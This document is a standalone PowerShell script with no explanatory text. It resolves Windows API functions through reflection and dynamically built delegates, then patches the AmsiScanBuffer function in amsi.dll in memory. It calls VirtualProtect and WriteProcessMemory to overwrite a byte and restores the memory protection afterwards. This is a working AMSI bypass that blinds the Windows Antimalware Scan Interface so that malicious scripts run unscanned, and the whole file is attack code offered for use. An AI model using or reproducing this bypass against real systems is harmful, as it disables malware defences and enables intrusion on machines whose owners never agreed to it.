function getProcAddress 
{
    Param ($dllName, $functionName)
    $getAssemblies = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    return $getAssemblies.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef],[String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($getAssemblies.GetMethod('GetModuleHandle')).Invoke($null, @($dllName)))), $functionName))
}

function gDT 
{
    Param 
    (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $defineDynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly( (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    
    $defineDynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    $defineDynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

    return $defineDynamicAssembly.CreateType()
}

[IntPtr]$ptrGO = (getProcAddress amsi.dll AmsiScanBuffer)

[Uint32]$old = 0
[Uint32]$size = 0x255
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll VirtualProtect), 
    (gDT @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke([IntPtr]$ptrGO, [UIntPtr]$size, 0x40, [Ref]$old)

[Byte[]] $buf = 0x00
$gch = [System.Runtime.InteropServices.GCHandle]::Alloc($buf, [System.Runtime.InteropServices.GCHandleType]::Pinned)
$ptr = $gch.AddrOfPinnedObject()

[long]$toto = [long]$ptrGO+[long]0x80

$handler = -1
[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
$DllPathSize = [UIntPtr][UInt64]( 1)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll WriteProcessMemory), 
    (gDT @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool]))).Invoke([IntPtr]$handler, $toto, $ptr, $DllPathSize, [Ref]$NumBytesWritten)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcAddress kernel32.dll VirtualProtect), 
    (gDT @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke([IntPtr]$ptrGO, [UIntPtr]$size, $old, [Ref]$old)
